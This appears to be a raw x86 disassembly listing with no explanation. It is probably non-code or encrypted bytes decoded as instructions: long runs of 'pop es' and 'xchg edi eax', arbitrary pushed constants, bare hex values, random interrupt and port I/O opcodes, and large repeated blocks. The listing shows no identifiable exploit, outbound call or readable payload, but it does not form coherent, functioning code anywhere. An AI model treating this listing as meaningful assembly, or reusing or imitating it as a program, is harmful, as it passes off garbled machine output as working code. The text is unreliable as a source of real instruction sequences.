sub ch [ eax + 0x68 ]
cwde
add dl [ esi + 0x1c ]
outsb
jle r-xdata
or [ ebp + 0x7e079797 ] 0xb5
nop
xchg edi eax
xchg edi eax
jle r-xdata
cdq
and al al
push ds
adc [ edi ] edi
xchg edi eax
movsd [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
mov ch 0x50
push 0xcff8fd68
jg r-xdata
jle r-xdata
pushfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
push ds
and al [ edi + 0x6a ]
push 0x87c06868
jle r-xdata
push ds
sar [ edi + 0x1c ] cl
shl [ ebx + 0x1e ] cl
sub ch [ eax + 0x68 ]
rol eax 0x1e
adc [ ebx ] edi
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
push 0xd7531468
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
pop ds
adc [ esi + 0x682a627e ] 0x68
mov edi 0x7079797
pop es
sar [ esi + 0x71 ] 0x5f
push 0x7070768
pop es
jle r-xdata
jg r-xdata
pop es
pop es
pop ss
0x12989587 0x50b5
push 0x4eb97ec7
push 0x7070768
pop es
pop es
pop es
xchg edi eax
xchg edi eax
jg r-xdata
cwde
xchg edi eax
xchg edi eax
pop es
dec [ eax + 0x7e979897 ]
jmp r-xdata
inc [ esi + 0x51 ]
xlat
inc esp
push 0x7070768
push 0xbf7ee3c1
lea edx [ edi + 0x7070797 ]
pop es
int1
push ds
0x7ebf
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
push 0x7fc00707
pop ebp
js r-xdata
pop es
pop es
int 0xfd
out 0xf1 eax
push ds
retn 0xcd4b
push 0x507ecece
push 0x66139868
jae r-xdata
push 0x47e0768
mov edx 0xd7e9797
pushfd
xchg edi eax
xchg edi eax
int1
push ds
sar [ ebx - 0x31 ] cl
jle r-xdata
push 0x97bdc17e
xchg edi eax
pop es
std
out dx eax
jle r-xdata
mov [ ebx - 0x5026869 ] ebx
pushfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ss
dec edx
push 0x12070768
push edi
jle r-xdata
mov ss [ edi - 0x69118169 ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
mov bh 0x7e
rcl [ eax + ebp * 2 + 0x68 ] 0xc2
sbb al 0x7b
jle r-xdata
adc [ edi + 0x7070797 ] 0x1cabc168
shr [ edi - 0x38 ] cl
int3
pop es
pop es
pop es
pop es
cwde
adc cl dl
mov esp 0x6f7e9797
inc ecx
push 0x9d797e68
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
jle r-xdata
dec eax
push 0x7f070768
nop
int3
fwait
xchg edi eax
xchg edi eax
std
cli
jl r-xdata
pop es
adc dl [ edi + 0x7e ]
ror [ eax + 0x68 ] cl
push 0x907f0707
mov dl 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
mov ah 0xc0
jle r-xdata
push 0x12835314
push edi
cwde
adc edi ebx
xchg esp eax
xchg edi eax
xchg edi eax
jle r-xdata
jpo r-xdata
mov edx 0x16079797
sub_48f4c5
push esp
push 0x47e0768
mov edx 0xd7e9797
pushfd
xchg edi eax
xchg edi eax
int1
push ds
sar [ ebx - 0x31 ] cl
jle r-xdata
mov [ ebx - 0x5026869 ] ebx
pushfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
mov ah 0xc0
jle r-xdata
mov ss [ edi - 0x69118169 ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
mov bh 0x7e
rcl [ eax + ebp * 2 + 0x68 ] 0xc2
sbb al 0x7b
jle r-xdata
adc [ edi + 0x7070797 ] 0x1cabc168
shr [ edi - 0x38 ] cl
int3
int3
fwait
xchg edi eax
xchg edi eax
std
cli
sub_48f5fe
sbb al 0x51
jle r-xdata
xchg edx eax
cld
inc eax
push 0x13980768
or al 0xa5
xchg edi eax
xchg edi eax
jle r-xdata
pop es
push ecx
push 0x68129868
sub ebp [ eax + 0x68 ]
mov esp 0x9d209865
0xf154
push edi
push 0x54ca0768
int1
push ds
shl [ edi - 0x31 ] cl
jle r-xdata
iretd
jpo r-xdata
pop es
pop es
sbb al 0xe2
lahf
jle r-xdata
push 0x7b1cc268
adc al 0x73
outsd
push 0x6a271a1a
push 0xbff67e68
xchg edi eax
js r-xdata
xchg edi eax
push 0x68518d7e
push 0x68070707
loop r-xdata
jle r-xdata
xchg ebx eax
xchg edi eax
xchg edi eax
xchg edx eax
pop esi
xchg edx eax
sub eax 0x97978268
jle r-xdata
push 0xfc9257fc
jg r-xdata
mov ah 0x97
xchg edi eax
pop es
pop es
pop es
pop es
jg r-xdata
adc ch [ eax + 0x2b ]
push 0x9865bc68
jle r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc esi [ esi + 0x1a686858 ]
sbb ah [ edi ]
push 0x68
push 0x97bff67e
imul ebp [ eax + 0x68 ] 0x7
pop es
pop es
pop es
pop es
sar [ edi + 0x74 ] 0x78
push 0x9b531468
jle r-xdata
aad 0xdf
cwde
adc al [ edx - 0x7b ]
xchg edi eax
push 0x963f0768
xchg edi eax
jle r-xdata
xchg ebp eax
xchg edi eax
xchg edi eax
jle r-xdata
sbb [ eax + 0x57a49797 ] al
push ss
jpo r-xdata
and [ ebp + 0x6865447e ] bl
push 0x147b1cc2
jae r-xdata
cwde
adc [ edi - 0x67f8f869 ] 0x13
cwde
xchg ebx eax
xchg edi eax
xchg edi eax
jle r-xdata
jle r-xdata
push 0x209865bc
popfd
sub [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jg r-xdata
inc esi
push 0x7070768
pop es
imul ebp [ eax + 0x68 ] 0x7e
push ecx
pushfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc dl [ edi + 0x7e ]
xor [ ecx + 0x68 ] cl
push 0x7070707
pop es
lodsb [ esi ]
shl [ ebx - 0x7131ed68 ] 0x1
mov al 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
les edx [ ecx - 0x2e ]
jpo r-xdata
sar [ ebx + 0x2f ] cl
dec ecx
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
dec esp
lodsb [ esi ]
jle r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
inc esp
push 0x7070768
pop es
into
jle r-xdata
jle r-xdata
pop es
aas
xchg esi eax
outsd
push 0x679d7e68
push 0x7070768
pop es
jns r-xdata
push 0x946e9468
dec esi
jpe r-xdata
cmpsd [ cs : esi ] [ edi ]
xchg edi eax
xchg edi eax
xchg edi eax
sbb al 0x96
sbb al 0xd7
fwait
sbb al 0xd7
fwait
jle r-xdata
pop es
pop es
sahf
xchg edi eax
xchg edi eax
cwde
adc esi [ ecx + 0x73 ]
push 0x744c7e68
push 0x79cc7f68
push 0x9b531468
scasb [ edi ]
in al dx
stosd [ edi ]
cwde
adc cl [ ebp + esi * 2 + 0x68 ]
push 0x684ab77e
push 0x4be268c4
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push 0x6846f47e
push 0x7070707
jle r-xdata
xchg edi eax
enter 0x511c 0xc9
push esp
sbb al dl
dec ebx
jg r-xdata
arpl [ eax + 0x68 ] bp
pop es
pop es
pop es
xchg edi eax
jle r-xdata
pop ebx
push 0x7070768
pop es
pop es
jg r-xdata
pop es
pop es
pop es
std
xchg edi eax
push 0x7070768
inc ecx
push 0xe8140768
lahf
xchg esp eax
push ds
shr [ edi + 0x12 ] cl
push edi
cwde
adc bl [ eax ]
adc [ edi - 0x37a85b69 ] 0x7e
xor [ ebx + 0x68 ] ah
push 0x680707
cmp edx [ edi + 0x7a7e9797 ]
push 0x4e946e94
pop es
int1
push ds
retn 0x7e5b
push 0xd59dfcff
aad 0x7e
0x6841
xchg edi eax
xchg edi eax
sbb al 0x67
adc ah [ ecx - 0x68 ]
adc ebx ebx
jbe r-xdata
xchg ebp eax
xchg edi eax
xchg edi eax
sar ch 0x95
jle r-xdata
enter 0x307e 0x63
push 0x68070768
add [ ebx ] bh
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
push edi
and [ eax + 0x68 ] ebp
jle r-xdata
jle r-xdata
push 0x4ab77e68
push 0xe268c468
dec ebx
pop es
pop es
pop es
int1
push ds
0x1c7b
jns r-xdata
pushfd
xchg edi eax
xchg edi eax
int1
adc dl [ edi + 0x7e ]
sbb al 0x4e
jle r-xdata
push 0x7070707
pop es
[ ebx + 0x1ecfb49d ]
pop es
pop es
into
sbb dl dl
jae r-xdata
inc edi
push 0x7070768
xchg edi eax
xchg edi eax
mov esi 0x7686855
pop es
pop es
retn 0x7b1c
lahf
int1
push ds
fisubr [ edi + 0x7f ]
retn
push 0x97a6e17e
xchg edi eax
jg r-xdata
jle r-xdata
jns r-xdata
jle r-xdata
and ebp [ eax + 0x68 ]
jle r-xdata
sti
sti
mov ecx 0xf36bd250
sti
sti
xchg edi eax
jle r-xdata
pop ebp
push 0x6beaae68
jle r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
push 0x978b657f
xchg edi eax
adc al 0x53
sbb al 0xd2
jle r-xdata
adc [ edi + 0x7070797 ] 0x7
pop es
pop es
pop es
push ebx
mov edi 0x7079797
pop es
pop es
lodsb [ esi ]
push esp
jle r-xdata
pop es
pop es
int1
adc dl [ edi - 0x68 ]
adc esi esp
sub eax 0x457e6868
jno r-xdata
sub ch [ eax + 0x68 ]
pop es
pop es
push ds
0x7e6b
push edi
pop es
adc al 0x6f
xlat
cwde
adc eax 0x97979405
jpo r-xdata
pop edi
push 0x68
push 0x4a907ec7
push 0x7070768
int1
push ds
push 0x68070707
and [ ebx - 0x69 ] dl
xchg edi eax
xchg edi eax
xchg edi eax
pop es
0x7079797 0x707
jle r-xdata
push 0xca1e0768
imul edi [ esi - 0x3f ] 0xffffff8d
xchg edi eax
xchg edi eax
cwde
adc esp [ edi + 0x7e686877 ]
sub eax 0x79797b8
push 0x667e0707
jne r-xdata
shl [ ebx - 0x38a85b2b ] cl
inc ebx
push 0x7b1cc268
jle r-xdata
jle r-xdata
xchg esi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
ror [ ebp + 0x13989797 ] 0xa7
ja r-xdata
push 0xaf7ef2fd
push eax
push 0xd21ef168
jns r-xdata
push 0x7070768
jle r-xdata
js r-xdata
movsb [ edi ] [ esi ]
push edi
xlat
pop esi
push esp
pop es
pop es
pop es
cwde
adc dh [ ebx ]
jno r-xdata
pop es
pop es
cdq
xchg edi eax
xchg edi eax
pop es
into
std
jle r-xdata
jle r-xdata
xchg edi eax
pop es
push 0x97b82d7e
xor esi [ ecx + 0x68 ]
std
int3
sbb bl [ ebx ]
mov bl 0xb
xchg edi eax
xchg edi eax
xchg edi eax
push 0x971797ff
xchg edi eax
std
xchg edi eax
push 0x7e8fb3e3
cmp [ eax + 0x68 ] 0x68
pop es
jle r-xdata
mov ebp 0xd21c9797
pop es
pop es
pop es
pop es
mov dl 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push eax
shr [ ebx - 0x6a ] cl
xchg edi eax
xchg edi eax
xchg edi eax
sbb al 0xd2
imul edi [ esi - 0x80 ] 0xffffff8b
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl al
xchg esi eax
jle r-xdata
imul edx [ esi + 0x1c979797 ] 0xffffffd2
jns r-xdata
jne r-xdata
pop es
pop es
pop es
pop es
pop es
push 0x121abfc1
push 0x7070707
std
mov [ 0xffffffffca1ef1cc ] eax
lahf
jle r-xdata
push 0x7b1c0707
push 0x68c48bc0
loop r-xdata
and [ eax + 0x68 ] ebp
pop es
jle r-xdata
int3
jo r-xdata
push 0xf1070707
push 0x97970f00
les edi [ esi + 0x8 ]
inc ebp
push 0x1a070768
sbb ch [ edi + 0x6a ]
push 0xb0717e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
sbb al 0x47
jle r-xdata
insb
push 0x817e0768
push 0x7070768
pop es
push 0x6a391398
push 0x97087e68
xchg edi eax
xchg edi eax
lodsb [ esi ]
shr [ edi + 0x7e ] cl
jbe r-xdata
push 0x6d2b121a
push 0x6139868
lahf
xchg edi eax
xchg edi eax
jle r-xdata
mov [ edi - 0xe1e0269 ] edx
push ds
shl [ edi + 0x7e ] cl
in eax dx
push 0x7070768
pop es
pop es
pop es
std
xchg edi eax
jle r-xdata
adc dh cl
or [ eax + 0x68 ] ebp
push cs
jle r-xdata
jl r-xdata
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
push ds
shl [ ebp - 0x31 ] cl
jle r-xdata
xchg ebp eax
xchg edi eax
xchg edi eax
cwde
adc [ edi + edx * 4 - 0x35e16869 ] edx
xchg edi eax
jle r-xdata
ror [ ebx + 0x7fe268c4 ] 0x68
add [ edi ] cl
xchg edi eax
xchg edi eax
push 0x53140768
fwait
jle r-xdata
imul edi [ esi + 0x26 ] 0x57
imul ebp [ eax + 0x68 ] 0x7
pop es
jle r-xdata
pop es
jg r-xdata
push 0x7070768
pop es
jle r-xdata
pop es
sbb al 0x7b
mov [ edi + 0x51140797 ] edx
xchg ebp eax
jle r-xdata
push 0x597f0768
push edi
jle r-xdata
jle r-xdata
pop es
pop es
pop es
push 0x7070707
mov ebp 0x68079797
loope r-xdata
iretd
insd
push 0x7070768
push 0xd21cc3e1
lahf
jle r-xdata
pop es
dec ebx
push 0x60137e68
push 0x7070768
int1
pop es
pop es
pop es
and ebp [ eax + 0x68 ]
pop es
pop es
pop es
std
stc
sbb al 0x4d
int1
push ds
0xcc95
push 0x3d21a68
mov ah 0x97
xchg edi eax
pop es
jno r-xdata
std
idiv [ esi + 0x4 ]
xchg edx eax
push 0x92977e07
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
arpl [ esi - 0x3f976869 ] dx
lahf
push 0x7e9fb3e3
and dh [ ebp + 0x68 ]
push ds
shl [ ebx + 0x7e ] cl
cmp bh [ edx + 0x7079797 ]
pop es
pop es
pop es
pop es
cwde
adc bh [ eax ]
push ebp
popad
push 0xd21c0768
outsd
push ds
sar [ ebx + 0x1c ] cl
shl [ ebx + 0x1e ] cl
shl [ edi + 0x7e ] cl
fidivr [ esi + 0x68 ]
push 0x7070707
pop es
pop es
std
jecxz r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
sbb dl [ edx ]

pop es
pop es
pop es
pop es
pop es
les edi [ esi + 0x35 ]
cdq
xchg edi eax
xchg edi eax
jle r-xdata
xchg edx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push [ eax - 0x70 ]
pop ss
bound edi [ esi - 0x46 ]
mov ah 0x97
xchg edi eax
jge r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0xf16d1c2f 0xea1e
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
push 0x97973b01
xchg edi eax
sbb bl [ edx ]
outsd
push 0x68
push 0x685ade7f
push 0x972b111c
xchg edi eax
xchg edi eax
jle r-xdata
pop es
jle r-xdata
pop ebx
push 0x7070768
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
dec ebp
push 0x7070768
pop es
pop es
retn 0x7b1c
pop es
pop es
pop es
jbe r-xdata
jle r-xdata
and [ eax + 0x68 ] ebp
pop es
pop es
sbb al 0x69
jle r-xdata
inc ecx
xchg [ edi + 0x7070797 ] dl
pop es
pop es
pop es
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd2
lahf
push edx
jecxz r-xdata
jle r-xdata
sbb al 0xe7
stosd [ edi ]
jle r-xdata
inc esp
push 0x1ef10768
0xc8f0fd7b 0x1ef1
enter 0xccc9 0x7e
and eax 0x7979797
pop es
pop es
jle r-xdata
out 0x6d eax
push 0x7070768
pop es
pop es
pop es
pop es
les edi [ esi + 0xe ]
pop edi
push 0x7070768
pop es
pop es
push esp
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc esi [ ecx ]
jns r-xdata
pushad
push 0x7070768
push 0x27907e44
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push 0x7070707
push 0xfd7e0707
pop es
pop es
pop es
int1
push ds
0xcc4b
push 0x9787917e
xchg edi eax
adc dl [ edi + 0x7e ]
xlat
sub_48f677
push 0x7070707
pop es
pop es
iretd
jpo r-xdata
xchg edi eax
push 0x68518d7e
push 0x68070707
loop r-xdata
jg r-xdata
mov ah 0x97
xchg edi eax
pop es
pop es
pop es
pop es
jg r-xdata
adc ch [ eax + 0x2b ]
push 0x9865bc68
jle r-xdata
aad 0xdf
cwde
adc al [ edx - 0x7b ]
xchg edi eax
push 0x963f0768
xchg edi eax
jle r-xdata
xchg ebp eax
xchg edi eax
xchg edi eax
jle r-xdata
sbb [ eax + 0x57a49797 ] al
push ss
jpo r-xdata
and [ ebp + 0x6865447e ] bl
push 0x147b1cc2
jae r-xdata
cwde
adc [ edi - 0x67f8f869 ] 0x13
cwde
xchg ebx eax
xchg edi eax
xchg edi eax
jle r-xdata
inc esi
push 0x7070768
pop es
imul ebp [ eax + 0x68 ] 0x7e
push ecx
pushfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc dl [ edi + 0x7e ]
xor [ ecx + 0x68 ] cl
push 0x7070707
pop es
lodsb [ esi ]
shl [ ebx - 0x7131ed68 ] 0x1
mov al 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
les edx [ ecx - 0x2e ]
jpo r-xdata
sar [ ebx + 0x2f ] cl
dec ecx
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
dec esp
lodsb [ esi ]
jle r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
inc esp
push 0x7070768
pop es
into
jle r-xdata
jle r-xdata
pop es
aas
xchg esi eax
outsd
push 0x679d7e68
push 0x7070768
pop es
jle r-xdata
xchg ebx eax
xchg edi eax
xchg edi eax
pop es
jns r-xdata
cmpsd [ cs : esi ] [ edi ]
xchg edi eax
xchg edi eax
xchg edi eax
sbb al 0x96
sbb al 0xd7
fwait
sbb al 0xd7
fwait
jle r-xdata
pop es
pop es
sahf
xchg edi eax
xchg edi eax
cwde
adc esi [ ecx + 0x73 ]
push 0x744c7e68
push 0x79cc7f68
push 0x9b531468
scasb [ edi ]
in al dx
stosd [ edi ]
cwde
adc cl [ ebp + esi * 2 + 0x68 ]
push 0x684ab77e
push 0x4be268c4
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push 0x6846f47e
push 0x7070707
jle r-xdata
xchg edi eax
enter 0x511c 0xc9
push esp
sbb al dl
dec ebx
jg r-xdata
arpl [ eax + 0x68 ] bp
pop es
pop es
pop es
xchg edi eax
jle r-xdata
pop ebx
push 0x7070768
pop es
pop es
jg r-xdata
pop es
pop es
pop es
std
xchg edi eax
push 0x7070768
inc ecx
pop es
pop es
pop es
pop es
pop es
cwde
adc esi [ esi + 0x1a686858 ]
sbb ah [ edi ]
push 0x68
push 0x97bff67e
xchg edi eax
pop es
imul ebp [ eax + 0x68 ] 0x7
pop es
pop es
pop es
pop es
sar [ edi + 0x74 ] 0x78
push 0x9b531468
jle r-xdata
push 0xe8140768
lahf
push 0x4e946e94
xchg edi eax
xchg edi eax
sbb al 0x67
adc ah [ ecx - 0x68 ]
adc ebx ebx
jbe r-xdata
xchg ebp eax
xchg edi eax
xchg edi eax
sar ch 0x95
jle r-xdata
enter 0x307e 0x63
push 0x68070768
add [ ebx ] bh
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
push edi
and [ eax + 0x68 ] ebp
jle r-xdata
push 0x209865bc
popfd
jle r-xdata
sub [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jg r-xdata
jle r-xdata
push 0x4ab77e68
push 0xe268c468
dec ebx
pop es
pop es
pop es
int1
push ds
0x1c7b
jns r-xdata
pushfd
xchg edi eax
xchg edi eax
int1
adc dl [ edi + 0x7e ]
pop es
pop es
sbb al 0xe2
lahf
jle r-xdata
push 0x7b1cc268
adc al 0x73
outsd
xchg esp eax
push ds
shr [ edi + 0x12 ] cl
push edi
cwde
adc bl [ eax ]
adc [ edi - 0x37a85b69 ] 0x7e
xor [ ebx + 0x68 ] ah
push 0x680707
cmp edx [ edi + 0x7a7e9797 ]
push 0x946e9468
dec esi
jpe r-xdata
sbb al 0x4e
jle r-xdata
push 0x7070707
pop es
[ ebx + 0x1ecfb49d ]
pop es
int1
push ds
retn 0x7e5b
push 0xd59dfcff
aad 0x7e
0x6841
pop es
pop es
into
sbb dl dl
jae r-xdata
inc edi
push 0x7070768
xchg edi eax
xchg edi eax
mov esi 0x7686855
pop es
pop es
retn 0x7b1c
lahf
int1
push ds
fisubr [ edi + 0x7f ]
retn
push 0x97a6e17e
xchg edi eax
jg r-xdata
jle r-xdata
jns r-xdata
jle r-xdata
and ebp [ eax + 0x68 ]
jle r-xdata
sti
sti
mov ecx 0xf36bd250
sti
sti
xchg edi eax
jle r-xdata
pop ebp
push 0x6beaae68
jle r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
push 0x978b657f
xchg edi eax
adc al 0x53
sbb al 0xd2
jle r-xdata
adc [ edi + 0x7070797 ] 0x7
pop es
pop es
pop es
push ebx
mov edi 0x7079797
pop es
pop es
lodsb [ esi ]
push esp
jle r-xdata
pop es
pop es
int1
adc dl [ edi - 0x68 ]
adc esi esp
sub eax 0x457e6868
jno r-xdata
sub ch [ eax + 0x68 ]
pop es
pop es
push ds
0x7e6b
push edi
pop es
adc al 0x6f
xlat
cwde
adc eax 0x97979405
jpo r-xdata
pop edi
push 0x68
push 0x4a907ec7
push 0x7070768
int1
push ds
push 0x68070707
and [ ebx - 0x69 ] dl
xchg edi eax
xchg edi eax
xchg edi eax
pop es
0x7079797 0x707
jle r-xdata
push 0xca1e0768
imul edi [ esi - 0x3f ] 0xffffff8d
xchg edi eax
xchg edi eax
cwde
adc esp [ edi + 0x7e686877 ]
sub eax 0x79797b8
push 0x667e0707
jne r-xdata
shl [ ebx - 0x38a85b2b ] cl
inc ebx
push 0x7b1cc268
jle r-xdata
jle r-xdata
xchg esi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
ror [ ebp + 0x13989797 ] 0xa7
ja r-xdata
push 0xaf7ef2fd
push eax
push 0xd21ef168
jns r-xdata
push 0x7070768
jle r-xdata
js r-xdata
movsb [ edi ] [ esi ]
push edi
xlat
pop esi
push esp
pop es
pop es
pop es
cwde
adc dh [ ebx ]
jno r-xdata
pop es
pop es
cdq
xchg edi eax
xchg edi eax
pop es
into
std
jle r-xdata
jle r-xdata
xchg edi eax
pop es
push 0x97b82d7e
xor esi [ ecx + 0x68 ]
std
int3
sbb bl [ ebx ]
mov bl 0xb
xchg edi eax
xchg edi eax
xchg edi eax
push 0x971797ff
xchg edi eax
std
xchg edi eax
push 0x7e8fb3e3
cmp [ eax + 0x68 ] 0x68
pop es
jle r-xdata
mov ebp 0xd21c9797
pop es
pop es
pop es
pop es
mov dl 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push eax
shr [ ebx - 0x6a ] cl
xchg edi eax
xchg edi eax
xchg edi eax
sbb al 0xd2
imul edi [ esi - 0x80 ] 0xffffff8b
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl al
xchg esi eax
jle r-xdata
imul edx [ esi + 0x1c979797 ] 0xffffffd2
jns r-xdata
jne r-xdata
pop es
pop es
pop es
pop es
pop es
push 0x121abfc1
push 0x7070707
std
mov [ 0xffffffffca1ef1cc ] eax
lahf
jle r-xdata
push 0x7b1c0707
push 0x68c48bc0
loop r-xdata
and [ eax + 0x68 ] ebp
pop es
jle r-xdata
int3
jo r-xdata
push 0xf1070707
push 0x97970f00
les edi [ esi + 0x8 ]
inc ebp
push 0x1a070768
sbb ch [ edi + 0x6a ]
push 0xb0717e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
sbb al 0x47
jle r-xdata
insb
push 0x817e0768
push 0x7070768
pop es
push 0x6a391398
push 0x97087e68
xchg edi eax
xchg edi eax
lodsb [ esi ]
shr [ edi + 0x7e ] cl
jbe r-xdata
push 0x6d2b121a
push 0x6139868
lahf
xchg edi eax
xchg edi eax
jle r-xdata
mov [ edi - 0xe1e0269 ] edx
push ds
shl [ edi + 0x7e ] cl
in eax dx
push 0x7070768
pop es
pop es
pop es
std
xchg edi eax
jle r-xdata
adc dh cl
or [ eax + 0x68 ] ebp
push cs
jle r-xdata
jl r-xdata
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
push ds
shl [ ebp - 0x31 ] cl
jle r-xdata
xchg ebp eax
xchg edi eax
xchg edi eax
cwde
adc [ edi + edx * 4 - 0x35e16869 ] edx
xchg edi eax
jle r-xdata
ror [ ebx + 0x7fe268c4 ] 0x68
add [ edi ] cl
xchg edi eax
xchg edi eax
push 0x53140768
fwait
jle r-xdata
imul edi [ esi + 0x26 ] 0x57
imul ebp [ eax + 0x68 ] 0x7
pop es
jle r-xdata
pop es
jg r-xdata
push 0x7070768
pop es
jle r-xdata
pop es
sbb al 0x7b
mov [ edi + 0x51140797 ] edx
xchg ebp eax
jle r-xdata
push 0x597f0768
push edi
jle r-xdata
jle r-xdata
pop es
pop es
pop es
push 0x7070707
mov ebp 0x68079797
loope r-xdata
iretd
insd
push 0x7070768
push 0xd21cc3e1
lahf
jle r-xdata
pop es
dec ebx
push 0x60137e68
push 0x7070768
int1
pop es
pop es
pop es
and ebp [ eax + 0x68 ]
pop es
pop es
pop es
std
stc
sbb al 0x4d
int1
push ds
0xcc95
push 0x3d21a68
mov ah 0x97
xchg edi eax
pop es
jno r-xdata
std
idiv [ esi + 0x4 ]
xchg edx eax
push 0x92977e07
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
arpl [ esi - 0x3f976869 ] dx
lahf
push 0x7e9fb3e3
and dh [ ebp + 0x68 ]
push ds
shl [ ebx + 0x7e ] cl
cmp bh [ edx + 0x7079797 ]
pop es
pop es
pop es
pop es
cwde
adc bh [ eax ]
push ebp
popad
push 0xd21c0768
outsd
push ds
sar [ ebx + 0x1c ] cl
shl [ ebx + 0x1e ] cl
shl [ edi + 0x7e ] cl
fidivr [ esi + 0x68 ]
push 0x7070707
pop es
pop es
std
jecxz r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
sbb dl [ edx ]

pop es
pop es
pop es
pop es
pop es
les edi [ esi + 0x35 ]
cdq
xchg edi eax
xchg edi eax
jle r-xdata
xchg edx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push [ eax - 0x70 ]
pop ss
bound edi [ esi - 0x46 ]
mov ah 0x97
xchg edi eax
jge r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0xf16d1c2f 0xea1e
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
push 0x97973b01
xchg edi eax
sbb bl [ edx ]
outsd
push 0x68
push 0x685ade7f
push 0x972b111c
xchg edi eax
xchg edi eax
jle r-xdata
pop es
jle r-xdata
pop ebx
push 0x7070768
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
dec ebp
push 0x7070768
pop es
pop es
retn 0x7b1c
pop es
pop es
pop es
jbe r-xdata
jle r-xdata
and [ eax + 0x68 ] ebp
pop es
pop es
sbb al 0x69
jle r-xdata
inc ecx
xchg [ edi + 0x7070797 ] dl
pop es
pop es
pop es
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd2
lahf
push edx
jecxz r-xdata
jle r-xdata
sbb al 0xe7
stosd [ edi ]
jle r-xdata
inc esp
push 0x1ef10768
0xc8f0fd7b 0x1ef1
enter 0xccc9 0x7e
and eax 0x7979797
pop es
pop es
jle r-xdata
out 0x6d eax
push 0x7070768
pop es
pop es
pop es
pop es
les edi [ esi + 0xe ]
pop edi
push 0x7070768
pop es
pop es
push esp
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc esi [ ecx ]
jns r-xdata
pushad
push 0x7070768
push 0x27907e44
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push 0x7070707
push 0xfd7e0707
pop es
pop es
pop es
int1
push ds
0xcc4b
push 0x9787917e
xchg edi eax
adc dl [ edi + 0x7e ]
xlat
sub_48f76f
outsb
push 0x97fd0768
push 0x97971701
push 0x4ab77e68
push 0xe268c468
dec ebx
push 0x6846f47e
push 0x7070707
xchg edi eax
sbb al 0x67
adc ah [ ecx - 0x68 ]
adc ebx ebx
jbe r-xdata
xchg edi eax
xchg ebp eax
xchg edi eax
xchg edi eax
sar ch 0x95
jle r-xdata
pop es
pop es
pop es
movsb [ edi ] [ esi ]
aad 0xdf
cwde
adc al [ edx - 0x7b ]
xchg edi eax
xchg edi eax
enter 0x511c 0xc9
push esp
sbb al dl
dec ebx
